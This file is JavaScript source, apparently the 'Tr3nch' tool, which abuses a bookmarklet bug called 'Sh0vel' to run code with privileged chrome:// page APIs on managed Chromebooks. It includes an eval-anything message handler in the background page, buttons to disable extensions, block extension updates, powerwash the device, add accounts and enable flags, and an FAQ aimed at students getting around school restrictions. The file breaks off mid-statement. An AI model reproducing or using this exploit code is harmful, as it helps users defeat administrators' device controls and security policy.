const withBackground = function (background) {
    function payload() {
        const onMessage = function (msg, sender, respond) {
            switch (msg.cmd) {
                case "runCode":
                    /* Since we're the background page, we'll want to be able to run code from the menu, and
					it just so happens Sh0vel requires eval, soooooo...*/
                    respond(eval(msg.code));
                    break;
                case "disable":
                    chrome.management.setEnabled(msg.id, !msg.disable);
                    break;
                case "tabOpen":
                    chrome.tabs.create({}, () => {
                        chrome.tabs.update({ url: msg.url });
                        chrome.tabs.reload();
                    });
                    break;
            }
        };
        chrome.runtime.onMessage.addListener(onMessage);
        chrome.runtime.onMessageExternal.addListener(onMessage);

        const onClicked = function () {
            function tabPayload() {
                if (!wr3nch) {
                    var wr3nch = true;
                } else {
                    return;
                } /* Don't inject Wr3nch twice. */
                console.log("Setting up Wr3nch menu");

                /* asPage is what really ties everything together, with bookmarklets having a bug that
				lets us run code outside of the content script's boundaries. This has been dubbed
				"sh0vel", and we can use it to not only access private chrome APIs, but also Mojo and WEBUI.*/
                const asPage = function (code) {
                    let link = window.open("about:blank", "_blank");
                    link.location.href = `javascript:
					(function() {
						chrome=opener.chrome;
						console=opener.console;
						if (opener.Mojo) {
							window.Mojo=opener.Mojo;
							window.mojo=opener.mojo;
							window.chromeos=opener.chromeos;
						}
						${code}
					})();
					`;
                    /* We don't call link.close here as some callbacks need to run before closing, so
					ALL asPage calls need to have window.close be the last thing that runs unless you need the extra tab */
                };
                /* For convenience, we'll want to run code as the extension too, as it may also
				have useful permissions that can be exploited.*/
                const asExt = function (code, ret = null) {
                    chrome.runtime.sendMessage(
                        chrome.runtime.id,
                        { cmd: "runCode", code: code },
                        null,
                        ret
                    );
                };

                /* Here we load in the base GUI, the options will be filled in later by loadMenuItems. */
                const loadMenuHTML = function () {
                    document.documentElement.innerHTML = `
					<!DOCTYPE html>
					<html lang="en">
						<head>
							<title>Tr3nch</title>
							<meta charset="utf-8">
							<base target="_blank">
						</head>
						<body>
							<div id="locked"></div>
							<div class="topBar">
								<h1>Tr3nch</h1>
								<p>
									Current Extension: ${chrome.runtime.getManifest().name} (${
                        chrome.runtime.id
                    }), Current Page: ${window.origin.replace(
                        "chrome://",
                        ""
                    )}, Chrome Version: R${chromeVer}
								</p>
								<a href="https://whelement.me">Whelement Homepage</a>
								<a href="https://discord.gg/fPU8cUvf">Whelement Discord</a>
								<a href="https://github.com/Whelement/Tr3nch">Source Code</a>
								<button id="unload">Deload Tr3nch</button>
								<button id="pubkey">View Public Key</button>
								<button id="faq">FAQ</button>
							</div>
							<div id="opt-container">
								<br>
							</div>
							<div class="credits">
								<h1>Credits</h1>
								<p1>Developed and brought to you by Whelement.</p1>
								<p>
									Zeglol1234: The idea, main developer<br>
									Writable: Skiovox Breakout implementations (Not affiliated with this project directly)<br>
									Bypassi: Add gmails bug and amongus exploit (Not affiliated with this project directly)<br>
									Notboeing747: Misc development and testing<br>
									Kxtz: Misc development and testing<br>
									Archimax: GUI inspiration<br>
									Kelsea: The logo<br>
									Katie: Testing<br>
									Evelyn: Meowing<br>
									The rest of Whelement: Mental support<br>
									<!-- Thanks for making poor design choices for us :trolley: -->
									${chrome.runtime.getManifest().name}: Being vulnerable to Sh0vel<br>
								</p>
							</div>
						</body>
						<style>
							body{
								margin: 0px;
								padding: 0px;
								font-family: monospace;
								background-color: #2c3e50;
								color: white;
							}
							.topBar{
								width: 100%;
								height: 140px;
								background-color: #2c3e50;
								text-align: center;
							}
							.credits{
								width: 100%;
								height: 275px;
								background-color: #2c3e50;
								text-align: center;
							}
							#page, #networkOpt{
								border: 2px solid white;
								width: 98%;
								margin: 0 auto 0;
								padding: 5px;
								height: 50px;
								text-align: left;
								cursor: default;
							}
							#page:hover{
								background-color: #152432;
							}
							#message{
								width: 100%;
								height: 90vh;
								border: 4px solid white;
								border-radius: 10px;
								background-color: #000;
								padding: 10px;
								text-align: center;
								position: absolute;
								left: 5%;
								overflow-wrap: break-word;
								overflow: scroll;
							}
							#locked{
								position: fixed;
								margin-left: auto;
								margin-right: auto;
								width: 90%;
							}
							#opt-container{
								background-color: #1d2936;
								text-align: center;
							}
							#pages, #networks{
								width: 75%;
								border: 3px solid white;
								margin: 0 auto 0;
								padding: 5px;
								min-height: 50px;
								max-height: 512px;
								overflow: scroll;
							}
							.evalBox{
								height: 200px;
								width: 550px;
								color: white;
								padding: 10px;
								background-color: #000;
								border-radius: 20px;
								border: 3px solid white;
								display: inline-block;
							}
							#extOutBox, #pageOutBox, #pbOutBox{
								height: 200px;
								width: 200px;
								color: white;
								padding: 10px;
								background-color: #000;
								border-radius: 20px;
								border: 3px solid white;
								display: inline-block;
								overflow: scroll;
							}
							input{
								height: 20px;
								width: 300px;
								color: white;
								padding: 10px;
								background-color: #000;
								border-radius: 20px;
								border: 3px solid white;
							}
							h1{
								cursor: default;
								font-size: 40px;
								font-weight: bold;
								margin-bottom: 0px;
							}
							hr{
								width: 750px;
							}
							button{
								height: 40px;
								padding: 10px;
								margin: 3px;
								border-radius: 20px;
								border: 3px solid white;
								color: white;
								background-color: #2c3e50;
								font-weight: bold;
							}
							button:hover{
								cursor: pointer;
								background-color: #1d2936;
							}
							p{
								cursor: default;
								color: white;
							}
							p1{
								cursor: default;
								font-size: 17px;
								font-weight: bold;
							}
							a{
								font-weight: bold;
								color: white;
							}
						</style>
					</html>
					`;

                    document
                        .querySelector("#unload")
                        .addEventListener("click", () => {
                            /* Close the menu and reload the background page, clearing all traces of Tr3nch */
                            asExt(
                                "chrome.tabs.getSelected((cur) => {chrome.tabs.remove(cur.id);location.reload();});"
                            );
                        });
                    document
                        .querySelector("#pubkey")
                        .addEventListener("click", () => {
                            /* This will work regardless of if the key is present in the manifest or not. */
                            message(
                                "Public Key",
                                `
						Current extension's public key:<br><br> ${
                            chrome.runtime.getManifest().key
                        }<br><br>
						This can be used to load the extension unpacked and modify its code, if you don't know how to do that or have no use then ignore this and move on.
						`
                            );
                        });
                    document
                        .querySelector("#faq")
                        .addEventListener("click", () => {
                            message(
                                "Frequently Asked Questions",
                                `
						<p1>Q: Some urls are blocked!</p1>
						<br>
						A: The url is likely set in a policy blocklist. This cannot be bypassed currently, though you should probably try disabling/loopkilling
						any filter extensions you have on your device to see if that fixes it. 
						<br><br>
						
						<p1>Q: There isn't an option for *blah blah blah*</p1>
						<br>
						A: Options rely on the current page and extension. If an option isn't present, it's because you're on the wrong page or your extension
						doesn't have the necessary permissions. Try visiting some of the pages in the quick redirect section to see more options.
						<br><br>
						
						<p1>Q: What are "EXPERIMENTAL"'s?</p1>
						<br>
						A: Those are options that are either not fully tested or not fully developed. I recommend you don't use them unless you know what you're doing.
						<br><br>

						<p1>Q: Will this still work if I update?</p1>
						<br>
						A: Yes, as long as you have code execution on the extension, which is persistent if you used skiovox breakout. This will likely never be patched.
						<br><br>
	
						<p1>Q: How do I update Tr3nch?</p1>
						<br>
						A: Tr3nch will regularly recieve updates with new features and bug fixes, I recommend you recopy Tr3nch.js from <a href="https://github.com/Whelement?Tr3nch" target="_blank">the source code</a>
						into skiovox breakout and evaluate it every now and then to keep Tr3nch up to date.
						<br><br>
	
						<p1>Q: I got my chromebook switched/powerwashed, will Tr3nch still be installed?</p1>
						<br>
						A: No, you will need to redo the setup if your chromebook ever gets replaced or powerwashed.
						<br><br>
	
						<p1>Q: Skiovox doesn't work anymore! Will I be able to do this in the future?</p1>
						<br>
						A: Yes, though it will require getting code execution on an extension vulnerable to Sh0vel, the bug Tr3nch relies on, which is
						difficult to do without skiovox. These instructions will be updated as more means of code execution are discovered.
						<br><br>
	
						<p1>Q: Can I get in trouble for using this?</p1>
						<br>
						A: At most your school will likely take your chromebook permissions away, if you don't misuse it and are smart about things,
						you should be fine.
						<br><br>
	
						<p1>Q: I found a bug, where do I report it?</p1>
						<br>
						A: Go to the source code, navigate to issues, make sure, there aren't any duplicates of your problem, and report it there.
						<br><br>
	
						<p1>Q: Tr3nch doesn't work when I'm in skiovox!</p1>
						<br>
						A: This is because of a bug with the tabs api, it cannot be fixed. 
						<br><br>
						`
                            );
                        });
                };

                const message = function (header, text) {
                    if (document.querySelector("#message") !== null)
                        return; /* Don't post a message if another one is present. */
                    let msg = document.createElement("div");
                    msg.id = "message";
                    msg.innerHTML = `
					<h1>${header}</h1>
					<hr>
					<p>${text}</p>
					<br>
					<button id="closeButton">Close</button>
					`;
                    msg.querySelector("#closeButton").addEventListener(
                        "click",
                        () => {
                            document.querySelector("#message").remove();
                        }
                    );

                    document.querySelector("#locked").append(msg);
                };
                const promptRequest = function (
                    header,
                    text,
                    placeholder,
                    callback
                ) {
                    if (document.querySelector("#message") !== null)
                        return; /* Don't post a textbox if another one is present. */
                    let msg = document.createElement("div");
                    msg.id = "message";
                    msg.innerHTML = `
					<h1>${header}</h1>
					<hr>
					<p>${text}</p>
					<br>
					<label>
						<input type="text" id="textboxRet" placeholder="${placeholder}">
					</label>
					<br>
					<button id="confButton">Confirm</button>
					<button id="goBack">Go Back</button>
					`;
                    msg.querySelector("#confButton").addEventListener(
                        "click",
                        () => {
                            let info =
                                document.querySelector("#textboxRet").value;
                            document.querySelector("#message").remove();
                            callback(info);
                        }
                    );
                    msg.querySelector("#goBack").addEventListener(
                        "click",
                        () => {
                            document.querySelector("#message").remove();
                        }
                    );

                    document.querySelector("#locked").append(msg);
                };
                const confirmRequest = function (
                    header,
                    text,
                    onTrue,
                    onFalse
                ) {
                    if (document.querySelector("#message") !== null)
                        return; /* Don't post a confirmation if another one is present. */
                    let msg = document.createElement("div");
                    msg.id = "message";
                    msg.innerHTML = `
					<h1>${header}</h1>
					<hr>
					<p>${text}</p>
					<br>
					<button id="contButton">Continue</button>
					<button id="cancButton">Cancel</button>
					`;
                    msg.querySelector("#contButton").addEventListener(
                        "click",
                        () => {
                            document.querySelector("#message").remove();
                            onTrue();
                        }
                    );
                    msg.querySelector("#cancButton").addEventListener(
                        "click",
                        () => {
                            document.querySelector("#message").remove();
                            onFalse();
                        }
                    );

                    document.querySelector("#locked").append(msg);
                };

                /* Check what the full extent of our permissions are based off the origin. */
                const checkPerms = function () {
                    /* We use window.origin so url parameters can't break the menu */
                    if (!window.origin.includes("chrome://")) return null;

                    switch (window.origin.replace("chrome://", "")) {
                        case "oobe":
                            return ["update", "webViewProxy"];
                            break;
                        case "extensions":
                            return ["manExtensions"];
                            break;
                        case "os-settings":
                            return [
                                "manageNetworks",
                                "addAccounts",
                                "siteSettings",
                                "update",
                                "restart",
                                "webViewProxy",
                                "disableExtensions",
                                "bluetooth",
                            ];
                            break;
                        case "settings":
                            return [
                                "addAccounts",
                                "siteSettings",
                                "update",
                                "restart",
                                "disableExtensions",
                            ];
                            break;
                        case "file-manager":
                            return ["files"];
                            break;
                        case "chrome-signin":
                            return ["webViewProxy", "signin"];
                            break;
                        case "network":
                            return ["manageNetworks"];
                            break;
                        case "policy":
                            return ["policies"];
                            break;
                        case "flags":
                            return ["flags"];
                            break;
                        case "inspect":
                            return ["inspect"];
                            break;
                        case "bluetooth-pairing":
                            return ["bluetooth"];
                            break;
                        default:
                            /* If a page isn't here, its permissions are not considered useful. */
                            return null;
                            break;
                    }
                };

                /* Get available permissions and make a container filled with menu options, then return it. */
                const loadMenuItems = function () {
                    let perms = checkPerms();
                    let container = document.createElement("div");
                    container.id = "items";

                    if (!chrome.extension) {
                        container.innerHTML =
                            "<p1>Tr3nch must be run from a content script</p1>";
                        return container;
                    }
                    if (chromeVer < 72) {
                        container.innerHTML =
                            "<p1>Tr3nch cannot run on versions lower than R72.</p1>";
                        return;
                    }

                    /*=================================================================
					Permission Independent Options
					Put options that don't need specific page permissions here
					=================================================================*/

                    let extEvalBox = document.createElement("div");
                    /* We can use innerHTML because we inherit the CSP from our extension */
                    extEvalBox.innerHTML = `
					<br>
					<h1>Run Code As Background Page</h1>
					<hr>
					<p>Run code directly as the background page of the extension Tr3nch is injected into</p>
					<br>
					<textarea spellcheck="false" class="evalBox" id="extEvalBox"></textarea>
					<div id="extOutBox"></div>
					<br>
					<button id="extEvalButton">Run as Background</button>
					<button id="consClear">Clear Output</button>
					`;
                    extEvalBox
                        .querySelector("#extEvalButton")
                        .addEventListener("click", () => {
                            asExt(
                                document.querySelector("#extEvalBox").value,
                                (ret) => {
                                    let cont =
                                        document.querySelector("#extOutBox");
                                    cont.append(JSON.stringify(ret));
                                    cont.append(document.createElement("br"));
                                }
                            );
                        });
                    extEvalBox
                        .querySelector("#consClear")
                        .addEventListener("click", () => {
                            document.querySelector("#extOutBox").innerHTML =
                                "Console Was Cleared.<br>";
                        });
                    container.append(extEvalBox);

                    let pbEvalBox = document.createElement("div");
                    pbEvalBox.innerHTML = `
					<br>
					<h1>Run Code As Sh0vel</h1>
					<hr>
					<p>Run code with direct access to this page's chrome API via Sh0vel. Access this page's DOM with window.opener.</p>
					<br>
					<textarea spellcheck="false" class="evalBox" id="pbEvalBox"></textarea>
					<div id="pbOutBox"></div>
					<br>
					<button id="pbEvalButton">Run as Sh0vel</button>
					<button id="consClear">Clear Output</button>
					`;
                    pbEvalBox
                        .querySelector("#pbEvalButton")
                        .addEventListener("click", () => {
                            asPage(
                                `console.log=function(log) {
							opener.document.querySelector('#pbOutBox').append(JSON.stringify(log));
							opener.document.querySelector('#pbOutBox').append(document.createElement('br'));
						};` + document.querySelector("#pbEvalBox").value
                            );
                        });
                    pbEvalBox
                        .querySelector("#consClear")
                        .addEventListener("click", () => {
                            document.querySelector("#pbOutBox").innerHTML =
                                "Console Was Cleared.<br>";
                        });
                    container.append(pbEvalBox);

                    let pageEvalBox = document.createElement("div");
                    pageEvalBox.innerHTML = `
					<br>
					<h1>Run Code On This Page</h1>
					<hr>
					<p>Run code directly as this content script without chrome API access.</p>
					<br>
					<textarea spellcheck="false" class="evalBox" id="pageEvalBox"></textarea>
					<div id="pageOutBox"></div>
					<br>
					<button id="pageEvalButton">Run as Page</button>
					<button id="consClear">Clear Ouput</button>
					`;
                    pageEvalBox
                        .querySelector("#pageEvalButton")
                        .addEventListener("click", () => {
                            window.location =
                                "javascript:" +
                                document.querySelector("#pageEvalBox").value;
                        });
                    pageEvalBox
                        .querySelector("#consClear")
                        .addEventListener("click", () => {
                            document.querySelector("#pageOutBox").innerHTML =
                                "Console Was Cleared.<br>";
                        });
                    container.append(pageEvalBox);

                    if (chrome.runtime.getManifest().manifest_version !== 3) {
                        let redirBox = document.createElement("div");
                        redirBox.innerHTML = `
						<br>
						<h1>Quick Navigate</h1>
						<hr>
						<p>Quickly redirect to various URLs to run Tr3nch on.</p>
						<br>
						`;
                        function addPage(page) {
                            let redir = document.createElement("button");
                            redir.innerText = page.replace("chrome://", "");
                            /* I have no clue why asExt is undefined in the Function statement here, so we'll just manually send the message. */
                            redir.addEventListener(
                                "click",
                                Function(
                                    `chrome.runtime.sendMessage({cmd: "tabOpen", url: "${page}"});`
                                )
                            );
                            redirBox.append(redir);
                        }
                        addPage("chrome://extensions");
                        if (navigator.appVersion.includes("CrOS"))
                            addPage("chrome://os-settings");
                        addPage("chrome://settings");
                        if (navigator.appVersion.includes("CrOS"))
                            addPage("chrome://file-manager");
                        addPage("chrome://chrome-signin");
                        addPage("chrome://bluetooth-pairing");
                        addPage("chrome://flags");
                        addPage("chrome://network");
                        addPage("chrome://policy");
                        addPage("chrome://bookmarks");

                        redirBox.append(document.createElement("br"));

                        addPage("chrome://crostini-installer");
                        addPage("chrome://history");
                        addPage("chrome://inspect");
                        addPage("chrome://version");
                        addPage("chrome://system");

                        /* This page was replaced with chrome-untrusted://terminal 
						sometime around R87, which cannot be accessed by Tr3nch. */
                        if (
                            chromeVer < 87 &&
                            navigator.appVersion.includes("CrOS")
                        )
                            addPage("chrome://terminal");
                        /* The OOBE can't be accessed from user sessions past R109. */
                        if (
                            chromeVer < 109 &&
                            navigator.appVersion.includes("CrOS")
                        )
                            addPage("chrome://oobe");

                        container.append(redirBox);
                    }

                    /*=================================================================
					Permission Dependent Options
					Put options that DO need specific page permissions here
					=================================================================*/

                    if (
                        chrome.runtime
                            .getManifest()
                            .permissions.includes("management") ||
                        (perms !== null &&
                            perms.includes("manExtensions") &&
                            chromeVer < 106)
                    ) {
                        let disableBox = document.createElement("div");
                        disableBox.innerHTML = `
						<br>
						<h1>Fully Disable/Enable Extensions</h1>
						<hr>
						<p>Fully disable/enable any extension by its ID.</p>
						<br>
						<div id="pages" class="installedExtensions">
							<p1>Extensions</p1>
						</div>
						<br>
						<label>
							<input id="disableIdBox" placeholder="Extension ID Here">
						</label>
						<br>
						<button id="disableIdButton">Disable Extension</button>
						<button id="enableIdButton">Enable Extension</button>
						`;
                        disableBox
                            .querySelector("#disableIdButton")
                            .addEventListener("click", () => {
                                if (
                                    perms.includes("manExtensions") &&
                                    chromeVer < 106
                                ) {
                                    asPage(
                                        `chrome.management.setEnabled('${
                                            document.querySelector(
                                                "#disableIdBox"
                                            ).value
                                        }', false);window.close();`
                                    );
                                    return;
                                }
                                /* Unfortunately we are still a content script, so we do have to play by the rules :( */
                                chrome.runtime.sendMessage({
                                    cmd: "disable",
                                    id: document.querySelector("#disableIdBox")
                                        .value,
                                    disable: true,
                                });
                            });
                        disableBox
                            .querySelector("#enableIdButton")
                            .addEventListener("click", () => {
                                if (
                                    perms.includes("manExtensions") &&
                                    chromeVer < 106
                                ) {
                                    asPage(
                                        `chrome.management.setEnabled('${
                                            document.querySelector(
                                                "#disableIdBox"
                                            ).value
                                        }', true);window.close();`
                                    );
                                    return;
                                }
                                chrome.runtime.sendMessage({
                                    cmd: "disable",
                                    id: document.querySelector("#disableIdBox")
                                        .value,
                                    disable: false,
                                });
                            });
                        /* We can't properly read extensions from a content script, so we keep viewing extensions
						exclusive to the manExtensions perm. Also, we have to add null checks here, otherwise if
						the viewer loads Tr3nch and the extension has the management permission, the menu will break. */
                        if (perms !== null && perms.includes("manExtensions")) {
                            let refresh = document.createElement("button");
                            refresh.innerText = "Refresh Extensions";
                            refresh.addEventListener("click", () => {
                                function refresher() {
                                    chrome.management.getAll((extensions) => {
                                        let cont =
                                            opener.document.querySelector(
                                                ".installedExtensions"
                                            );
                                        cont.innerText = "";

                                        let e = document.createElement("p1");
                                        e.innerText = "Extensions";
                                        cont.append(e);

                                        for (
                                            let i = 0;
                                            i < extensions.length;
                                            i++
                                        ) {
                                            let ext =
                                                document.createElement("div");
                                            ext.id = "page";
                                            ext.innerText =
                                                extensions[i].name +
                                                " - ID: " +
                                                extensions[i].id +
                                                " - Enabled: " +
                                                extensions[i].enabled;

                                            cont.append(ext);
                                        }
                                        window.close();
                                    });
                                }
                                asPage(`${refresher.toString()};refresher();`);
                            });
                            disableBox.append(refresh);
                        } else {
                            disableBox.querySelector(
                                ".installedExtensions"
                            ).innerHTML =
                                "<p1>Extensions cannot be displayed. Load Tr3nch on chrome://extensions to view installed extensions.</p1>";
                        }

                        container.append(disableBox);
                    }

                    if (perms == null) {
                        if (!window.origin.includes("chrome:"))
                            message(
                                "Lacking Permissions",
                                "The page you're attempting to run Tr3nch on is not priveledged.<br> Please run this on a url starting with 'chrome://'."
                            );
                        else
                            message(
                                "Lacking Permissions",
                                "The page you're attempting to run Tr3nch on is not Priveledged.<br> Please run this on a different chrome URL, the current will not work for anything useful."
                            );
                        return container; /* For unpriveledged pages, extension permissions are still accessible, so stop only after loading them in. */
                    }

                    if (perms.includes("update")) {
                        let updateBox = document.createElement("div");
                        updateBox.innerHTML = `
						<br>
						<h1>Update Manager</h1>
						<hr>
						<p>Force, Disable, and Enable automatic updates for the OS or Extension.</p>
						<button id="updateOS">Update System</button>
						<button id="caub">Disable Consumer Autoupdates</button>
						<button id="uncaub">Enable Consumer Autoupdates</button>
						`;
                        updateBox
                            .querySelector("#updateOS")
                            .addEventListener("click", () => {
                                asPage(
                                    "chrome.send('requestUpdate');window.close();"
                                );
                            });
                        updateBox
                            .querySelector("#caub")
                            .addEventListener("click", () => {
                                asPage(
                                    "chrome.send('setConsumerAutoUpdate', ['false']);window.close();"
                                );
                            });
                        updateBox
                            .querySelector("#uncaub")
                            .addEventListener("click", () => {
                                asPage(
                                    "chrome.send('setConsumerAutoUpdate', ['true']);window.close();"
                                );
                            });

                        let update_url =
                            chrome.runtime.getManifest().update_url;
                        if (
                            update_url !== undefined &&
                            !update_url.includes("clients2.google.com")
                        ) {
                            let extCaub = document.createElement("button");
                            extCaub.innerText =
                                "Prevent Extension Updating (Amongus Exploit)";
                            extCaub.addEventListener("click", () => {
                                asExt(
                                    "chrome.extension.setUpdateUrlData('ඞ'.repeat(1024));"
                                );
                            });

                            updateBox.append(extCaub);
                        }

                        container.append(updateBox);
                    }
                    if (perms.includes("restart")) {
                        let restartBox = document.createElement("div");
                        restartBox.innerHTML = `
						<br>
						<h1>User Session Management</h1>
						<hr>
						<p>Reset, exit, or wipe the current user session.</p>
						<button id="restart">Restart Chrome</button>
						<button id="signout">Sign out</button>
						<button id="powerwash">Powerwash</button>
						<button id="userexit">Attempt User Exit</button>
						`;

                        restartBox
                            .querySelector("#restart")
                            .addEventListener("click", () => {
                                asPage(
                                    "chrome.send('restart');window.close();"
                                );
                            });
                        restartBox
                            .querySelector("#signout")
                            .addEventListener("click", () => {
                                confirmRequest(
                                    "Confirm Sign Out",
                                    "Are you sure you want to sign out?",
                                    () => {
                                        asPage(
                                            "chrome.send('signOutAndRestart');window.close();"
                                        );
                                    },
                                    () => {
                                        return;
                                    }
                                );
                            });
                        restartBox
                            .querySelector("#powerwash")
                            .addEventListener("click", () => {
                                confirmRequest(
                                    "Warning!",
                                    "Continuing further will remove all userdata!<br> Are you sure you want to do this?",
                                    () => {
                                        message(
                                            "Powerwashing...",
                                            "Please wait, do not close the computer."
                                        );
                                        /* For those curious, false here prevents a tpm firmware update */
                                        asPage(
                                            "chrome.send('factoryReset', ['false']);window.close();"
                                        );
                                    },
                                    () => {
                                        message(
                                            "Cancelled",
                                            "Powerwash cancelled."
                                        );
                                    }
                                );
                            });
                        restartBox
                            .querySelector("#userexit")
                            .addEventListener("click", () => {
                                asPage(
                                    "chrome.send('AttemptUserExit');window.close();"
                                );
                            });

                        container.append(restartBox);
                    }
                    if (perms.includes("files")) {
                        let fileBox = document.createElement("div");
                        fileBox.innerHTML = `
						<br>
						<h1>Misc Options</h1>
						<hr>
						<p>Various options for the fileManagerPrivate permission.</p>
						<button id="reauth">Signout and Reauthenticate</button>
						<button id="devtools">(EXPERIMENTAL) Open Inspector</button>
						`; /* More options to be added soon hopefully, otherwise ill just make a "random" section. */

                        fileBox
                            .querySelector("#reauth")
                            .addEventListener("click", () => {
                                asPage(
                                    "chrome.fileManagerPrivate.logoutUserForReauthentication();window.close();"
                                );
                            });
                        fileBox
                            .querySelector("#devtools")
                            .addEventListener("click", () => {
                                asPage(
                                    "chrome.fileManagerPrivate.openInspector('console');window.close();"
                                );
                            });

                        container.append(fileBox);
                    }
                    if (perms.includes("signin")) {
                        let signinBox = document.createElement("div");
                        signinBox.innerHTML = `
						<br>
						<h1>SignIn Options</h1>
						<hr>
						<p>Various options for the chrome-signin page.</p>
						<button id="incog">(EXPERIMENTAL) Open Incognito</button>
						<button id="guest">(EXPERIMENTAL) Open Guest Window</button>
						`;

                        signinBox
                            .querySelector("#incog")
                            .addEventListener("click", () => {
                                asPage(
                                    'chrome.send("showIncognito");window.close();'
                                );
                            });
                        signinBox
                            .querySelector("#guest")
                            .addEventListener("click", () => {
                                if (navigator.appVersion.includes("CrOS")) {
                                    message(
                                        "Not Available",
                                        "Guest windows cannot be opened on ChromeOS."
                                    );
                                } else {
                                    asPage(
                                        'chrome.send("openGuestWindow");window.close();'
                                    );
                                }
                            });

                        container.append(signinBox);
                    }
                    if (perms.includes("inspect")) {
                        let inspectBox = document.createElement("div");
                        inspectBox.innerHTML = `
						<br>
						<h1>Inspect Element</h1>
						<hr>
						<p>Open inspect element (devtools) on various URLs.</p>
						<div id="pages"></div>
						<button id="refresh">Refresh Pages</button>
						`;
                        inspectBox
                            .querySelector("#refresh")
                            .addEventListener("click", () => {
                                function refresher() {
                                    document.title = "Tr3nch Inspector";
                                    document.body.innerText =
                                        "This page is being used to allow inspect element. If you close it, refresh pages to recreate it.";
                                    opener.populateTargets = function (
                                        type,
                                        data
                                    ) {
                                        const refreshPages = function (data) {
                                            let pageCont =
                                                document.createElement("div");
                                            pageCont.id = "pageContainer";

                                            for (
                                                let i = 0;
                                                i < data.length;
                                                i++
                                            ) {
                                                let page =
                                                    document.createElement(
                                                        "div"
                                                    );
                                                page.id = "page";
                                                /* Because Sh0vel runs outside of the content script's boundaries, we no longer
											inherit CSP from our extension, so we can't use eval or innerHTML here. Instead,
											let's do it the old-fashioned way. */
                                                page.innerText = `${data[i].name} `;
                                                let inspectButton =
                                                    document.createElement(
                                                        "button"
                                                    );
                                                inspectButton.innerText = `Inspect ${data[i].type}`;

                                                /* We register the listener in a sub-function like this so variables don't change for each button. */
                                                (function (stuff) {
                                                    inspectButton.addEventListener(
                                                        "click",
                                                        () => {
                                                            chrome.send(
                                                                "inspect",
                                                                [
                                                                    stuff.source,
                                                                    stuff.id,
                                                                ]
                                                            );
                                                        }
                                                    );
                                                })(data[i]);

                                                page.append(inspectButton);
                                                pageCont.append(page);
                                            }

                                            let oldCont =
                                                opener.document.querySelector(
                                                    "#pageContainer"
                                                );
                                            if (oldCont !== null)
                                                oldCont.remove();
                                            opener.document
                                                .querySelector("#pages")
                                                .append(pageCont);

                                            opener.populateTargets =
                                                function () {};
                                            /*window.close(); /* This breaks the listeners registered on the buttons, to be fixed soon */
                                        };

                                        if (type == "local") refreshPages(data);
                                    };
                                }
                                asPage(`${refresher.toString()};refresher();`);
                            });

                        container.append(inspectBox);
                    }
                    if (perms.includes("addAccounts")) {
                        let accBox = document.createElement("div");
                        accBox.innerHTML = `
						<br>
						<h1>Manage Accounts</h1>
						<hr>
						<p>Mess around with profiles on the current user session.</p>
						<button id="gmailAdd">Add User Gmail</button>
						<button id="profileAdd">Add Profile Dialog</button>
						`;
                        accBox
                            .querySelector("#gmailAdd")
                            .addEventListener("click", () => {
                                confirmRequest(
                                    "Warning!",
                                    `
							Continuing further may break signin on some pages until you add your account here.<br>
							However, you will be able to add any account you want to the device. Are you sure you want to do this?<br>
							`,
                                    () => {
                                        asPage(
                                            "chrome.send('TurnOffSync');window.close();"
                                        );
                                        /* window.open has a few problems, lets use tabs.create instead. */
                                        asExt(
                                            "chrome.tabs.create({url: 'https://tinyurl.com/addSession'});"
                                        );
                                    },
                                    () => {
                                        message(
                                            "Cancelled",
                                            "Sync has not been touched, signin will function as normal."
                                        );
                                    }
                                );
                            });
                        accBox
                            .querySelector("#profileAdd")
                            .addEventListener("click", () => {
                                asPage(
                                    "chrome.send('addAccount');window.close();"
                                );
                            });

                        container.append(accBox);
                    }
                    if (perms.includes("flags")) {
                        let flagBox = document.createElement("div");
                        flagBox.innerHTML = `
						<br>
						<h1>Manage Flags</h1>
						<hr>
						<p>Tamper with unstable OS features and restart.</p>
						<label>
							<input type="text" id="flagBox" placeholder="Place your flag name here" value="borealis-enabled@1">
						</label>
						<button id="enableFlag">Enable Flag</button>
						<button id="restartBrowser">Restart User Session</button>
						`;
                        flagBox
                            .querySelector("#enableFlag")
                            .addEventListener("click", () => {
                                asPage(
                                    `chrome.send('enableExperimentalFeature', ['${
                                        document.querySelector("#flagBox").value
                                    }','true']);window.close();`
                                );
                            });
                        flagBox
                            .querySelector("#restartBrowser")
                            .addEventListener("click", () => {
                                asPage(
                                    'chrome.send("restartBrowser");window.close();'
                                );
                            });

                        container.append(flagBox);
                    }
                    if (perms.includes("policies")) {
                        let policyBox = document.createElement("div");
                        policyBox.innerHTML = `
						<br>
						<h1>Policies</h1>
						<hr>
						<p>Sync and export policies.</p>
						<button id="relPolicy">Policy Sync</button>
						<button id="exPolicy">Export Policies</button>
						`;

                        policyBox
                            .querySelector("#relPolicy")
                            .addEventListener("click", () => {
                                asPage(
                                    "chrome.send('reloadPolicies');window.close();"
                                );
                            });
                        policyBox
                            .querySelector("#exPolicy")
                            .addEventListener("click", () => {
                                asPage(
                                    "chrome.send('exportPoliciesJSON');window.close();"
                                );
                            });

                        container.append(policyBox);
                    }
                    if (perms.includes("bluetooth")) {
                        let blueBox = document.createElement("div");
                        blueBox.innerHTML = `
						<br>
						<h1>Bluetooth Settings</h1>
						<hr>
						<p>Manage bluetooth settings and connections.</p>
						<button id="startDiscover">Start Discovery</button>
						<button id="stopDiscover">Stop Discovery</button>
						`;
                        blueBox
                            .querySelector("#startDiscover")
                            .addEventListener("click", () => {
                                function startDiscovery() {
                                    chrome.bluetooth.getAdapterState(
                                        (state) => {
                                            if (!state.powered) {
                                                alert(
                                                    "Bluetooth is powered off, cannot search for devices."
                                                );
                                                window.close();
                                            }
                                            if (!state.discovering) {
                                                chrome.bluetooth.startDiscovery();
                                            }
                                            window.close();
                                        }
                                    );
                                }
                                asPage(
                                    `${startDiscovery.toString()};startDiscovery();`
                                );
                            });
                        blueBox
                            .querySelector("#stopDiscover")
                            .addEventListener("click", () => {
                                function startDiscovery() {
                                    chrome.bluetooth.getAdapterState(
                                        (state) => {
                                            if (state.discovering) {
                                                chrome.bluetooth.stopDiscovery();
                                            }
                                            window.close();
                                        }
                                    );
                                }
                                asPage(
                                    `${startDiscovery.toString()};startDiscovery();`
                                );
                            });

                        container.append(blueBox);
                    }
                    if (perms.includes("manageNetworks")) {
                        let netBox = document.createElement("div");
                        netBox.innerHTML = `
						<br>
						<h1>Network Settings</h1>
						<hr>
						<p>Mess around with internet settings.</p>
						<div id="networks">
							<p1>Known Networks</p1>
						</div>
						<button id="bringUp">Turn Network On</button>
						<button id="bringDown">Turn Network Off</button>
						<button id="refreshNet">Refresh Networks</button>
						<button id="connectNet">Connect To Network</button>
						`;
                        netBox
